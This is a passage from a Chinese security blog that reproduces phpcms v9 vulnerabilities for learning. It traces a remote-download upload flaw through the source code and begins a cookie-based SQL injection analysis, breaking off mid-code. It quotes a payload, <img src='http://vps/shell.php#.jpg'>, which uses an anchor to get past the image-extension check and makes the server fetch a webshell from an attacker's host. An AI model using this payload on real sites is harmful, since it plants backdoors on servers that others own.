= $field;</span><br><span class="line">	$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">	$uploadpath = $upload_url.$dir;</span><br><span class="line">	$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">	$string = new_stripslashes($value);</span><br><span class="line">	<span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">	$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		dir_create($uploaddir);</span><br><span class="line">		$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>($matches, $string);</span><br><span class="line">	$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">	$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		$filename = fileext($file);</span><br><span class="line">		$file_name = basename($file);</span><br><span class="line">		$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">		$newfile = $uploaddir.$filename;</span><br><span class="line">		$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">		<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">			$oldpath[] = $k;</span><br><span class="line">			$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">			@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">			$fileext = fileext($filename);</span><br><span class="line">			<span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">				watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">			&#125;</span><br><span class="line">			$filepath = $dir.$filename;</span><br><span class="line">			$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">			$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">			<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">				$oldpath[] = $k;</span><br><span class="line">				$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">				@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">				$fileext = fileext($filename);</span><br><span class="line">				<span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">					watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">				&#125;</span><br><span class="line">				$filepath = $dir.$filename;</span><br><span class="line">				$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">				$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>验证，创建路径给路径权限，创建新文件，将上传内容写入新文件，返回新文件的路径，上传文件成功。(这里我是根据POC，一路debug的，基本就是把作者的思路走了一遍….好菜啊，都没有自己的想法)</p>
<h2 id="考虑过滤"><a href="#考虑过滤" class="headerlink" title="考虑过滤"></a>考虑过滤</h2><p>作者给的payload中的<strong><code>$info[&#39;content&#39;]=&lt;img src=&quot;http://vps/shell.php#.jpg&quot;&gt;</code></strong><br>这个让我想起之前神盾杯的时候，锚点过滤的一道题，参考<a href="https://mochazz.github.io/2019/06/14/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">学长的博客中神盾杯那篇</a><br>分析一下，为啥这里可以使用’#’<br>定位：modules/member/index.php::register() 137行<br>register()函数中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>])</span><br></pre></td></tr></table></figure></p>
<p>跟进函数new_html_special_chars()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line"> * 返回经htmlspecialchars处理过的字符串或数组</span><br><span class="line"> * @param $obj 需要处理的字符串或数组</span><br><span class="line"> * @<span class="keyword">return</span> mixed</span><br><span class="line"> */</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_html_special_chars</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$encoding = <span class="string">'utf-8'</span>;</span><br><span class="line">	<span class="keyword">if</span>(strtolower(CHARSET)==<span class="string">'gbk'</span>) $encoding = <span class="string">'ISO-8859-15'</span>;</span><br><span class="line">	<span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> htmlspecialchars($string,ENT_QUOTES,$encoding);</span><br><span class="line">	<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>其中的htmlspecialchars()，用于防止xss攻击<br><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/1.png" alt=""></p>
<p>定位caches/caches_model/caches_data/member_input.class.php::get() 30行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$field = safe_replace($field);</span><br></pre></td></tr></table></figure></p>
<p>跟进safe_replace()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 安全过滤函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后来到download()函数，位于phpcms/libs/classes/attachment.class.php::download() 152行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$string = new_stripslashes($value);</span><br></pre></td></tr></table></figure></p>
<p>跟进new_stripslashes()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回经stripslashes处理过的字符串或数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string 需要处理的字符串或数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_stripslashes</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> stripslashes($string);</span><br><span class="line">	<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_stripslashes($val);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/2.png" alt=""></p>
<p>接着看到153行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches))  <span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure></p>
<p>这个正则表达式可以理解为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(href|src)=([\<span class="string">"|']?)([^\"'&gt;]+\.(gif|jpg|jpeg|bmp|png))\2</span></span><br></pre></td></tr></table></figure></p>
<p>这里检测后缀名为gif|jpg|jpeg|bmp|png的文件，但是由于过滤不够严格，所以还是可以绕过，demo一下<br><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/4.png" alt=""></p>
<p>在神盾杯的那道题中，之所以可以使用锚点，就是因为在url请求中’#’以后的数据，在请求中是不带的<br><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/5.png" alt=""></p>
<p>而在这里，我们会看到过滤后的数据会进入fillurl()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			dir_create($uploaddir);</span><br><span class="line">			$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">		&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>跟进函数fillurl()::300行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>截取’#’之前的内容，所以绕过过滤后，将会通过<a href="http://vps/shell.php得到文件内容" target="_blank" rel="noopener">http://vps/shell.php得到文件内容</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是那句话，善于使用debug,动态调试，然后在一些小的地方，可以通过var_dump()，print_r()，这种函数，进行手动debug,代码的分析能力还需提高。<br>要加深对数据库的学习。多学吧，送给自己一句话：现在浪费的时间，都是给未来的自己挖坑。</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/18/phpcmsv9sql注入漏洞-复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/18/phpcmsv9sql注入漏洞-复现/" class="post-title-link" itemprop="url">phpcmsv9sql注入漏洞[复现]</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-18 13:14:34" itemprop="dateCreated datePublished" datetime="2019-07-18T13:14:34+08:00">2019-07-18</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-07-20 23:05:51" itemprop="dateModified" datetime="2019-07-20T23:05:51+08:00">2019-07-20</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>ubuntu19<br>php5.6+mysql<br>phpstorm+burpsuit<br>phpcmsv9.6.0(我下载的版本UTF8)</p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>太差劲了，啥都不会，然后POC都搞不懂，代码逻辑的理解能力差到抠脚，干啥啥不会……要善于使用debug,能解决大量的代码问题。菜的明明白白。然后这次复现的漏洞，我看了一些文章，发现这个漏洞确实鸡肋，但是我觉得我这啥都不会的，就无所谓鸡肋了，能有收获就好了，这个漏洞的逻辑性，我觉得也挺有意思的。</p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>由于代码对于cookie的过滤，以及sql过滤不当，使得我们可以插入sql报错语句，进行报错注入。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>之前的phpcms的路由分析，我已经分(chao)析(xi)得很详细了…..在我的另外一篇博客里，然后这里就直接看到漏洞代码<br>然后像phpcms这样的，面对对象的系统框架，在查看每一个类的方法是，都要先去看一下，这个类中定义的变量和构造方法<br>定位：phpcms/modules/attachment/attachements.php::swfupload_json()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $att_db;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	pc_base::load_app_func(<span class="string">'global'</span>);<span class="comment">//加载global.func.php</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);<span class="comment">//http://127.0.0.1/phpcms/uploadfile/</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;upload_path = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_path'</span>);<span class="comment">//PHPCMS_PATH.'uploadfile/'</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;imgext = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'gif'</span>,<span class="string">'png'</span>,<span class="string">'bmp'</span>,<span class="string">'jpeg'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;isadmin = <span class="keyword">$this</span>-&gt;admin_username = $_SESSION[<span class="string">'roleid'</span>] ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;groupid = param::get_cookie(<span class="string">'_groupid'</span>) ? param::get_cookie(<span class="string">'_groupid'</span>) : <span class="number">8</span>;</span><br><span class="line">	<span class="comment">//判断是否登录</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;userid))&#123;</span><br><span class="line">		showmessage(L(<span class="string">'please_login'</span>,<span class="string">''</span>,<span class="string">'member'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</span><br><span class="line">	$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</span><br><span class="line">	$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</span><br><span class="line">	$json_str = json_encode($arr);</span><br><span class="line">	$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);<span class="comment">//第一次访问，所以这个值是空的</span></span><br><span class="line">	$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);<span class="comment">//空的......</span></span><br><span class="line">	<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123; <span class="comment">//$att_arr_exist_tmp不存在，执行else语句</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">		param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;			</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br></pre></td></tr></table></figure></p>
<p>可以看到这里根据程序判断从<strong>$_SESSION[‘userid’]</strong>，<strong>get_cookie(‘_userid’)</strong>，<strong><code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;))</code></strong>获取userid。得到了正常的，可用的userid,才能进行下面的操作。</p>
<p>然后看向swfupload_json()这个函数，其中从用户输入的aid,src,filename三个变量中获取数据。存入数组$arr，像这样<br><strong>$arry=array(‘aid’=&gt;’xxx’,’src’=&gt;’xxx’,’filename’=&gt;’xxx’)</strong><br>接着进行json_encode($arr),最后执行<strong>param::set_cookie(‘att_json’,$json_str);</strong>,我们可以跟进set_cookie<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">		$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">		$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">		$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;<span class="comment">//CeFuT_att_json</span></span><br><span class="line">		$_COOKIE[$var] = $value;<span class="comment">//$_COOKIE[CeFuT_att_json]=$json_str = json_encode($arr);</span></span><br><span class="line">		<span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">				setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这段代码将创建cookie返回给用户，可以看到这里的sys_auth()函数，跟进看一下，会发现这里是一个加密函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sys_auth</span><span class="params">($string, $operation = <span class="string">'ENCODE'</span>, $key = <span class="string">''</span>, $expiry = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	$ckey_length = <span class="number">4</span>;</span><br><span class="line">	$key = md5($key != <span class="string">''</span> ? $key : pc_base::load_config(<span class="string">'system'</span>, <span class="string">'auth_key'</span>));</span><br><span class="line">	$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">	$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == <span class="string">'DECODE'</span> ? substr($string, <span class="number">0</span>, $ckey_length): substr(md5(microtime()), -$ckey_length)) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">	$cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">	$string = $operation == <span class="string">'DECODE'</span> ? base64_decode(strtr(substr($string, $ckey_length), <span class="string">'-_'</span>, <span class="string">'+/'</span>)) : sprintf(<span class="string">'%010d'</span>, $expiry ? $expiry + time() : <span class="number">0</span>).substr(md5($string.$keyb), <span class="number">0</span>, <span class="number">16</span>).$string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">	$result = <span class="string">''</span>;</span><br><span class="line">	$box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">	$rndkey = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($operation == <span class="string">'DECODE'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>).$keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span 